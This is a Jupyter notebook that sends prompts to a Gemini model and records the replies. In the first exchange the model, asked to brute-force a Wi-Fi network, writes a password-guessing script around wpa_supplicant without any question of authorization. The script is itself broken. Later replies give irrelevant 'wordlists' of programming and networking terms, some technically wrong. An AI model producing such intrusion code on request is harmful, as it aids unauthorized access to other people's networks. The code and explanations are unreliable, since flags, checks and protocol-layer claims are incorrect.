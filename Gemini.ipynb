{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "O6QVoO4A3fk6"
      },
      "outputs": [],
      "source": [
        "pip install -U -q google-generativeai"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "import pathlib\n",
        "import textwrap\n",
        "import google.generativeai as genai\n",
        "import PIL.Image\n",
        "from IPython.display import display,Markdown\n"
      ],
      "metadata": {
        "id": "8snZYdKb3i2T"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "def to_markdown(text):\n",
        "  text=text.replace('•', '  *')\n",
        "  return Markdown(textwrap.Indent(text,\"> \",predicate=lambda _ : True))\n"
      ],
      "metadata": {
        "id": "oEGAubue36W2"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "genai.configure(api_key=\"XXXXXXXXXXXX\") #Enter your own API Key after creating in Gemini Website"
      ],
      "metadata": {
        "id": "DkMNZhwJ380i"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "model=genai.GenerativeModel(\"gemini-pro\")"
      ],
      "metadata": {
        "id": "9rkfWeZD47cJ"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "input1=input()\n",
        "response=model.generate_content(input1)"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 35
        },
        "id": "YxhavU2W5HJa",
        "outputId": "7e840536-abb4-4dcb-f11c-04d883fde9ab"
      },
      "execution_count": null,
      "outputs": [
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "Write a program in python for bruteforcing a wifi network\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "response.text"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 219
        },
        "id": "0Tn2SIxD5Lw9",
        "outputId": "711d6901-4cc1-4529-ad70-da36e8448b47"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "'```python\\nimport subprocess\\nimport time\\nimport os\\n\\ndef main():\\n    # Get the interface name of the Wi-Fi network you want to bruteforce\\n    interface = input(\"Enter the interface name of the Wi-Fi network you want to bruteforce: \")\\n\\n    # Get the BSSID of the Wi-Fi network you want to bruteforce\\n    bssid = input(\"Enter the BSSID of the Wi-Fi network you want to bruteforce: \")\\n\\n    # Get the wordlist to use for bruteforcing the password\\n    wordlist = input(\"Enter the wordlist to use for bruteforcing the password: \")\\n\\n    # Start the bruteforce attack\\n    print(\"Starting bruteforce attack...\")\\n\\n    # Read each password from the wordlist and try to connect to the Wi-Fi network using that password\\n    with open(wordlist, \"r\") as f:\\n        for password in f:\\n            password = password.strip()\\n\\n            # Connect to the Wi-Fi network using the current password\\n            subprocess.call([\"wpa_supplicant\", \"-i\", interface, \"-B\", bssid, \"-p\", password], stdout=subprocess.PIPE, stderr=subprocess.PIPE)\\n\\n            # Wait for a few seconds to see if the connection was successful\\n            time.sleep(5)\\n\\n            # Check if the connection was successful\\n            if subprocess.call([\"iwconfig\", interface], stdout=subprocess.PIPE, stderr=subprocess.PIPE) == 0:\\n                print(\"Password found:\", password)\\n                break\\n\\n    # If the password was not found, print a message\\n    else:\\n        print(\"Password not found\")\\n\\nif __name__ == \"__main__\":\\n    main()\\n```'"
            ],
            "application/vnd.google.colaboratory.intrinsic+json": {
              "type": "string"
            }
          },
          "metadata": {},
          "execution_count": 20
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "input1=input()\n",
        "model.generate_content(input1).text"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 164
        },
        "id": "0aWjDCFW-nrc",
        "outputId": "2f22dc97-688f-4bd4-8e8d-5023798d24d8"
      },
      "execution_count": null,
      "outputs": [
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "Generate a list of words that i can use for the program that you generated just now\n"
          ]
        },
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "'Here are some words that you can use for the program:\\n\\n* **Input:** The data that is entered into the program.\\n* **Output:** The data that is produced by the program.\\n* **Variable:** A named memory location that can store a value.\\n* **Data type:** The type of data that a variable can store, such as integer, floating-point number, or character.\\n* **Operator:** A symbol that represents an operation, such as addition, subtraction, or multiplication.\\n* **Expression:** A combination of variables, operators, and constants that evaluates to a single value.\\n* **Statement:** A command that tells the program to do something, such as print a value or store a value in a variable.\\n* **Function:** A block of code that can be called from other parts of the program.\\n* **Loop:** A structure that allows the program to repeat a block of code multiple times.\\n* **Conditional statement:** A statement that allows the program to execute different blocks of code depending on whether a condition is true or false.\\n* **Program:** A set of instructions that tells the computer what to do.\\n* **Algorithm:** A step-by-step procedure for solving a problem.\\n* **Debugging:** The process of finding and fixing errors in a program.\\n* **Documentation:** The information that describes how a program works.\\n* **Syntax:** The rules that define the structure of a program.\\n* **Semantics:** The meaning of a program.\\n\\nIn addition to these general terms, you may also want to use words that are specific to the programming language that you are using. For example, if you are using Python, you may want to use words like \"list,\" \"tuple,\" and \"dictionary.\"'"
            ],
            "application/vnd.google.colaboratory.intrinsic+json": {
              "type": "string"
            }
          },
          "metadata": {},
          "execution_count": 21
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "input1=input()\n",
        "model.generate_content(input1).text"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 384
        },
        "id": "JXREXfhg-28r",
        "outputId": "badd9c40-a812-4346-d60f-4b39bd74a533"
      },
      "execution_count": null,
      "outputs": [
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "can you optimise the words so that i can use it to brute force wifi networks\n"
          ]
        },
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "'1. **SSID:** Service Set Identifier. Name of the Wi-Fi network.\\n\\n2. **BSSID:** Basic Service Set Identifier. MAC address of the access point.\\n\\n3. **Channel:** Radio frequency channel used by the Wi-Fi network.\\n\\n4. **Security:** Type of encryption used by the Wi-Fi network (e.g., WEP, WPA, WPA2).\\n\\n5. **Password:** Encryption key used to access the Wi-Fi network.\\n\\n6. **Signal Strength:** Strength of the Wi-Fi signal.\\n\\n7. **Noise Level:** Level of background noise on the Wi-Fi channel.\\n\\n8. **Data Rate:** Speed at which data is transferred over the Wi-Fi network.\\n\\n9. **Latency:** Time delay between sending a data packet and receiving a response.\\n\\n10. **Jitter:** Variation in latency.\\n\\n11. **Throughput:** Amount of data that can be transferred over the Wi-Fi network in a given amount of time.\\n\\n12. **Packet Loss:** Percentage of data packets that are lost during transmission.\\n\\n13. **Retries:** Number of times a data packet is retransmitted before it is considered lost.\\n\\n14. **Encryption:** Process of converting data into a form that cannot be easily understood by unauthorized people.\\n\\n15. **Authentication:** Process of verifying the identity of a user or device.\\n\\n16. **Association:** Process of connecting a device to a Wi-Fi network.\\n\\n17. **Deauthentication:** Process of disconnecting a device from a Wi-Fi network.\\n\\n18. **Disassociation:** Process of removing a device from a Wi-Fi network.\\n\\n19. **Probe Request:** Message sent by a device to discover available Wi-Fi networks.\\n\\n20. **Probe Response:** Message sent by an access point in response to a probe request.\\n\\n21. **Beacon Frame:** Message sent by an access point to announce its presence and capabilities.\\n\\n22. **Management Frame:** Type of Wi-Fi frame used for control and signaling purposes.\\n\\n23. **Data Frame:** Type of Wi-Fi frame used to transmit data.\\n\\n24. **Control Frame:** Type of Wi-Fi frame used to manage the connection between two devices.\\n\\n25. **PHY:** Physical layer. Lowest layer of the Wi-Fi protocol stack.\\n\\n26. **MAC:** Medium access control. Layer of the Wi-Fi protocol stack that controls access to the wireless medium.\\n\\n27. **LLC:** Logical link control. Layer of the Wi-Fi protocol stack that provides a reliable connection between two devices.\\n\\n28. **IP:** Internet Protocol. Layer of the Wi-Fi protocol stack that routes data packets between devices.\\n\\n29. **TCP:** Transmission Control Protocol. Layer of the Wi-Fi protocol stack that provides a reliable connection-oriented service.\\n\\n30. **UDP:** User Datagram Protocol. Layer of the Wi-Fi protocol stack that provides an unreliable connectionless service.'"
            ],
            "application/vnd.google.colaboratory.intrinsic+json": {
              "type": "string"
            }
          },
          "metadata": {},
          "execution_count": 22
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [],
      "metadata": {
        "id": "nUnyw97yAthY"
      },
      "execution_count": null,
      "outputs": []
    }
  ]
}